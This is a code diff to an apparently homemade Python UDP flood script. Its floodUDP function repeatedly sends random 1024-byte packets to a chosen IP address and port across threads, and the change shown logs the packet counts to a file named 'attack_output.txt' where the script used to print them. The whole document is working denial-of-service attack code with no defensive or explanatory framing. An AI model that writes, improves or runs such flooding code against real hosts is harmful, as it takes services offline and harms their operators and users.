@@ -16,7 +16,6 @@ times = 5
 threads = 1
 
 
-
 def floodUDP():
     j = True
     data = random._urandom(1024)
@@ -27,13 +26,10 @@ def floodUDP():
             address = (ip, port)
             for x in range(times):
                 s.sendto(data, address)
-                if(j == True):
-                    print(i + " packets sent.")
-                    j = False
-            # file_txt = open("attack_output.txt", 'a')
-            # file_txt.writelines(i)
-            # file_txt.writelines(" packets sent")
-            # file_txt.writelines("\n")
+                file_txt = open("attack_output.txt", 'a')
+                file_txt.writelines(i)
+                file_txt.writelines(" packets sent")
+                file_txt.writelines("\n")
         except:
             print("Error")
             break
@@ -62,3 +58,11 @@ for y in range(threads):
         th.start()
     else:
         print("Wrong input given")
+
+
+"""
+if(j == True):
+print(i + " packets sent.")
+j = False
+
+"""
